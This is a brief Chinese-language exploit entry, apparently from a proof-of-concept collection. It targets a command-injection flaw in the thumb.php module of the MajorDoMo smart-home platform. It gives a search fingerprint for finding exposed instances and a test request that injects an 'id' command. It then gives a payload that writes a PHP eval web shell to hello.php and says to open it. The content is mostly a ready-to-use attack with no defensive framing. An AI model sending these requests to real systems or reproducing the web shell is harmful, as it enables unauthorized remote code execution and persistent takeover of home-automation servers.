# 智能家居平台MajorDoMothumb存在命令执行漏洞

- **系统**：智能家居平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="MajordomoSL"`
- **请求**：`GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+id%3B HTTP/1.1`
- **关键头**：`Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36`

**请求体 / payload**
```
GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7Cecho%20%27%3C%3Fphp%20@eval%28$_POST%5Bcmd%5D%29%3B%3F%3E%27%20%3E%20hello.php%3B HTTP/1.1
Host:
访问
Ip/hello.php
```
- **预期**：200　|　—